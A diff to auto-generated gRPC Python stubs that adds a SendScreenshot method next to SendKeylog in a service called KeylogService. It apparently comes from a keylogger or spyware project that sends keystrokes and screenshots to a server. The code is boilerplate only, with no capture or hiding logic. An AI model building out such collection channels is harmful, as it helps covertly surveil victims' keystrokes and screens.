@@ -39,12 +39,23 @@ class KeylogServiceStub(object):
                 request_serializer=server__pb2.KeylogRequest.SerializeToString,
                 response_deserializer=server__pb2.KeylogResponse.FromString,
                 _registered_method=True)
+        self.SendScreenshot = channel.unary_unary(
+                '/KeylogService/SendScreenshot',
+                request_serializer=server__pb2.ScreenshotRequest.SerializeToString,
+                response_deserializer=server__pb2.ScreenshotResponse.FromString,
+                _registered_method=True)
 
 
 class KeylogServiceServicer(object):
     """Missing associated documentation comment in .proto file."""
 
     def SendKeylog(self, request, context):
+        """Missing associated documentation comment in .proto file."""
+        context.set_code(grpc.StatusCode.UNIMPLEMENTED)
+        context.set_details('Method not implemented!')
+        raise NotImplementedError('Method not implemented!')
+
+    def SendScreenshot(self, request, context):
         """Missing associated documentation comment in .proto file."""
         context.set_code(grpc.StatusCode.UNIMPLEMENTED)
         context.set_details('Method not implemented!')
@@ -57,6 +68,11 @@ def add_KeylogServiceServicer_to_server(servicer, server):
                     servicer.SendKeylog,
                     request_deserializer=server__pb2.KeylogRequest.FromString,
                     response_serializer=server__pb2.KeylogResponse.SerializeToString,
+            ),
+            'SendScreenshot': grpc.unary_unary_rpc_method_handler(
+                    servicer.SendScreenshot,
+                    request_deserializer=server__pb2.ScreenshotRequest.FromString,
+                    response_serializer=server__pb2.ScreenshotResponse.SerializeToString,
             ),
     }
     generic_handler = grpc.method_handlers_generic_handler(
@@ -86,6 +102,33 @@ class KeylogService(object):
             '/KeylogService/SendKeylog',
             server__pb2.KeylogRequest.SerializeToString,
             server__pb2.KeylogResponse.FromString,
+            options,
+            channel_credentials,
+            insecure,
+            call_credentials,
+            compression,
+            wait_for_ready,
+            timeout,
+            metadata,
+            _registered_method=True)
+
+    @staticmethod
+    def SendScreenshot(request,
+            target,
+            options=(),
+            channel_credentials=None,
+            call_credentials=None,
+            insecure=False,
+            compression=None,
+            wait_for_ready=None,
+            timeout=None,
+            metadata=None):
+        return grpc.experimental.unary_unary(
+            request,
+            target,
+            '/KeylogService/SendScreenshot',
+            server__pb2.ScreenshotRequest.SerializeToString,
+            server__pb2.ScreenshotResponse.FromString,
             options,
             channel_credentials,
             insecure,
